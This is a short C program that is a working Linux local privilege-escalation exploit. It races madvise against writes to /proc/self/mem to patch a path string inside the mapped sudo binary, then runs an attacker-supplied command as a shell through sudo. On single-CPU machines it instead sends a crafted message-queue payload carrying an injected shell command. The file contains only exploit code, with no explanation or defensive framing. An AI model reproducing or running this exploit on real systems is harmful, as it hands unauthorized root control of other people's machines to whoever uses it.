#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/stat.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <string.h>
#include <unistd.h>
#include <grp.h>
#include <stdlib.h>
#include <stdio.h>

#define MSG "\xff\xff\xff\x7f\x00\x00\x00\x00\x24\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#define SU "/tmp/su"
#define SUDO "/usr/bin/sudo"

int stop;
void *mad(void *map) {
	while (!stop) madvise(map, 4096, MADV_DONTNEED);
	return NULL;
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("usage: %s [cmd]\n", argv[0]);
        return 0;
    }
    if (sysconf(_SC_NPROCESSORS_ONLN) == 1) {
    	char dummy[65536];
        char buf[1024];
        int q = msgget(0xa1230f, 0);
        memcpy(buf, MSG, sizeof(MSG));
        if (msgsnd(q, buf, sizeof(MSG) + sprintf(buf + sizeof(MSG), "\";%s;\"", argv[1]) + 1, 0) == 0)
            msgrcv(q, dummy, 0x10000, 0x7fffffff, 0);
        return 0;
    }
    int sudo = open(SUDO, O_RDONLY);
    char *map = (char*)mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, sudo, 0);
    char *pp = memmem(map, 4096, "/lib", 4);
    pthread_t pth;
    if (pp != NULL) {
        pthread_create(&pth, NULL, &mad, map);
        int fd = open("/proc/self/mem", O_RDWR);
        char buf[4] = "/lib";
        for (int i = 0; (i < 10000000) && (!memcmp(buf, "/lib", 4)); i++) {
            pwrite(fd, SU, sizeof(SU), (off_t)(unsigned)pp);
            if (!(i&0xff))
                pread(sudo, buf, 4, pp-map);
        };
        stop = 1;
        pthread_join(pth, NULL);
    }
    return execl(SUDO, "/bin/sh", "/bin/sh", "-c", argv[1], NULL);
}
